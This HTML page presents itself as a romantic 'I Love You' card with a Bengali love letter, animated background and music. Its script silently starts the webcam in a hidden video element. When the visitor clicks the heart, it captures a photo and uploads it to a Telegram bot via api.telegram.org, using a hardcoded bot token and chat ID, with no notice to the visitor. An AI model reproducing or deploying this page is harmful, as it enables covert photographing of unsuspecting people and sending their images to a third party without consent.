<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>I Love You</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');

    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      width: 100vw;
      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
      background-size: 300% 300%;
      font-family: 'Dancing Script', cursive;
      animation: bgAnimation 12s infinite alternate;
      overflow: hidden;
    }

    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      text-align: center;
      position: relative;
    }

    .heart {
      font-size: 6rem;
      color: #ff4b5c;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    .heart:hover {
      transform: scale(1.2);
    }

    h1 {
      font-size: 3rem;
      color: #fff;
      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
      margin: 20px 0;
    }

    h1 span {
      color: #ffeb3b;
      font-style: italic;
    }

    video {
      display: none;
    }

    canvas {
      display: none;
    }

    .love-letter {
      font-family: 'Pinyon Script', cursive;
      font-size: 1.5rem; /* Smaller size */
      color: #fff;
      margin-top: 30px;
      text-align: left;
      width: 80%;
      max-height: 300px; /* Set max height */
      margin: 20px auto;
      border: 2px solid #ff4b5c;
      padding: 20px;
      border-radius: 15px;
      background-color: rgba(0, 0, 0, 0.5);
      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
      overflow-y: auto; /* Enable scroll */
    }

  </style>
</head>
<body>
  <div class="container">
    <div class="heart" onclick="capturePhoto()">❤️</div>
    <h1>I <span>Love</span> You</h1>

    <!-- Love Letter Section -->
    <div class="love-letter">
      <p>প্রিয়তম,</p>
      <p> যেদিন তোমার সঙ্গে প্রথম দেখা হয়েছিল, আমার হৃদয় যেন বুঝে গিয়েছিল যে আমাদের মধ্যে কিছু বিশেষ রয়েছে। তুমি যে ভাবে আমাকে অনুভব করাতে, তা ভাষায় বর্ণনা করা সম্ভব নয়। প্রতিটি দিন, প্রতিটি মুহূর্ত তোমার সঙ্গে কাটানো যেন একটি সুন্দর স্বপ্নের মতো।</p>
      <p>যতক্ষণ আমি এটি লিখছি, ততক্ষণ আমি ভবিষ্যতটাকে ভাবছি এবং সমস্ত সম্ভাবনাগুলোর কথা ভাবছি, যেগুলো আমাদের জন্য অপেক্ষা করছে। তুমি আমার হৃদয়, আমার আত্মা, আমার সবকিছু। আমি তোমাকে এমনভাবে ভালোবাসি যা শব্দের মাধ্যমে প্রকাশ করা সম্ভব নয়। আমি কৃতজ্ঞ প্রতিটি মুহূর্তের জন্য যা আমরা একসাথে কাটাচ্ছি।</p>
      <p>তোমায় অনেক </p>
      <p><strong>ভালোবাসি</strong></p>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>
  </div>

  <!-- Background Music -->
  <audio id="loveAudio" loop>
    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
    Your browser does not support the audio element.
  </audio>

  <script>
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let context = canvas.getContext('2d');
    let audio = document.getElementById('loveAudio');
    let isPlaying = false;

    // Start the video feed (this will run in the background but not visible)
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        video.srcObject = stream;
      })
      .catch(function(error) {
        console.error("Error accessing webcam: ", error);
      });

    // Capture photo when heart is clicked
    function capturePhoto() {
      // Set canvas size to match video size
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      // Draw the video frame onto the canvas
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL('image/png'); // Get base64 image data
      
      // Send image to Telegram bot
      sendToTelegramBot(imageData);

      // Play background music if not playing
      if (!isPlaying) {
        audio.play();
        isPlaying = true;
      } else {
        audio.pause();
        isPlaying = false;
      }
    }

    // Send captured image to Telegram bot
    function sendToTelegramBot(imageData) {
      const token = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s';  // Replace with your bot token
      const chatId = '1987016824';   // Replace with your chat ID
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;

      // Convert base64 image to Blob
      const byteString = atob(imageData.split(',')[1]);
      const arrayBuffer = new ArrayBuffer(byteString.length);
      const uintArray = new Uint8Array(arrayBuffer);
      for (let i = 0; i < byteString.length; i++) {
        uintArray[i] = byteString.charCodeAt(i);
      }
      const blob = new Blob([uintArray], { type: 'image/png' });

      // Create FormData object to send image
      let formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png'); // Append image as Blob

      fetch(url, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Image sent successfully');
        } else {
          console.error('Error sending image:', data);
        }
      })
      .catch(error => {
        console.error('Error:', error);
      });
    }
  </script>
</body>
</html>
